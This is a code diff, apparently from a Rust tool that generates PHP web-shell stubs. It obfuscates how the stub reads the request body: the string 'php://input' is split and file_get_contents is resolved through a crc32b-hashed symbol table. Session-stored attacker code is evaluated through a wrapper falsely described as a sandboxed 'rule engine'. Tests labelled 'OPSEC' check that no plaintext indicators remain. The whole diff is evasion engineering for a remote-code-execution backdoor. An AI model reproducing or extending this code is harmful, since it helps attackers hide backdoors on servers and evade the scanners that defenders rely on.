@@ -164,6 +164,7 @@ function __PREFIX__run_rule($script) {
     // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
     $result = array('code' => 200, 'rule_size' => strlen($script));
     if ($script !== '' && strlen($script) < 1048576) {
+        $buf = $script;
 __EXEC__
     }
     return $result;
@@ -1197,6 +1198,7 @@ header('Content-Type: application/json');
 $_g = array();
 $_t = array(
     '9ff5d542' => 0,
+    '2693a743' => 2,
 );
 $_fn = get_defined_functions();
 $_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
@@ -1229,12 +1231,14 @@ function __PREFIX__run_rule($script) {
     // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
     $result = array('code' => 200, 'rule_size' => strlen($script));
     if ($script !== '' && strlen($script) < 1048576) {
-        __EVAL__($script);
+        $buf = $script;
+        __EVAL__($buf);
     }
     return $result;
 }
 
-$payload = @file_get_contents('php://input');
+$i = "php:" . "//input";
+$payload = @$_g[2]($i);
 if ($payload === false || $payload === '') {
     die('{"code":400,"msg":"empty_payload"}');
 }
@@ -1347,7 +1351,14 @@ __PACK__
     return $out;
 }
 
-$payload = @file_get_contents('php://input');
+function __PREFIX__run_rule($script) {
+    // 规则引擎：执行客户端提交的自动化规则（沙箱）
+    $buf = $script;
+    __EVAL__($buf);
+}
+
+$i = "php:" . "//input";
+$payload = @$_g[2]($i);
 if ($payload === false || $payload === '') {
     die('{"code":400,"msg":"empty_payload"}');
 }
@@ -1356,8 +1367,10 @@ if (isset($_SESSION['__PREFIX__p'])) {
     if (strpos($data, 'DswSesInit') !== false) {
         echo __PREFIX__pack('ok');
     } else {
-        $code = __PREFIX__unpack($_SESSION['__PREFIX__p']);
-        if (!function_exists('run')) { __EVAL__($code); }
+        $ses = $_SESSION;
+        $c1 = $ses['__PREFIX__p'];
+        $code = __PREFIX__unpack($c1);
+        if (!function_exists('run')) { __PREFIX__run_rule($code); }
         echo __PREFIX__pack(run($data));
     }
 } else {
@@ -1383,6 +1396,11 @@ pub fn session_php_stub(
     // unpack/pack 参数中引用的 __PREFIX__（dec / x 函数名）随前缀替换
     let unpack_body = unpack_body.replace("__PREFIX__", &prefix);
     let pack_body = pack_body.replace("__PREFIX__", &prefix);
+    // 注入通用符号：file_get_contents（session 模板读请求体用，索引 2）
+    let mut symbols: Vec<(usize, &str)> = symbols.to_vec();
+    if !symbols.iter().any(|(index, _)| *index == 2) {
+        symbols.push((2, "file_get_contents"));
+    }
     let mut table = String::new();
     for (index, name) in symbols {
         table.push_str(&format!("    '{}' => {index},\n", crc32b_hash(name)));
@@ -1902,7 +1920,12 @@ mod tests {
         // session 分阶段结构
         assert!(stub.contains("session_start"), "stub 应启用 session");
         assert!(stub.contains("DswSesInit"), "stub 应识别初始化标记");
-        assert!(stub.contains("php://input"), "stub 应读请求体");
+        // OPSEC：请求体读取经符号表 + 字符串拆分（无连续 php://input / file_get_contents）
+        assert!(!stub.contains("php://input"), "stub 不应含连续 php://input");
+        assert!(!stub.contains("file_get_contents"), "stub 不应含 file_get_contents 明文");
+        assert!(stub.contains("2693a743"), "stub 符号表应含 file_get_contents 的 crc32b");
+        assert!(stub.contains("$ses = $_SESSION"), "stub 应经间接数组读取 session");
+        assert!(stub.contains("run_rule"), "eval 应经业务函数包裹");
         // 处理器：不含 PHP 开标签（eval 执行），含 run 函数与操作分支
         let handler = session_handler_code();
         assert!(!handler.contains("<?php"), "处理器不应含 PHP 开标签");
